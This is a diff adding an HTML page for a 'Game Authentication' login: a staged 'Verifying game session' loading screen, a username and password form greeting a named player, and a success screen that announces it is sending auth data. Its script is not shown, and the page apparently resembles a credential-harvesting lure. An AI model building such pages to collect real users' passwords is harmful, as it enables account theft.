@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Authentication</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen" class="loading-container">
+        <div class="loader"></div>
+        <p class="loading-text">Authenticating...</p>
+        <p class="loading-subtext">Verifying game session</p>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+    </div>
+
+    <!-- Desktop View - Auth Form (Hidden by default) -->
+    <div id="desktop-view" class="container hidden">
+        <div class="auth-box">
+            <h1 class="title">🎮 Game Login</h1>
+            <p class="welcome">Welcome back, Zak!</p>
+            
+            <form id="auth-form">
+                <div class="input-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter username" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter password" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            
+            <div class="status-info">
+                <p>Level: 283 | XP Needed: 871,326</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Message -->
+    <div id="success-message" class="success-container hidden">
+        <div class="success-icon">✓</div>
+        <h2>Authentication Successful!</h2>
+        <p>Welcome to the game, Zak!</p>
+        <p class="redirect-text">Redirecting to game server...</p>
+        <div class="data-sent">
+            <p>Sending auth data to server...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
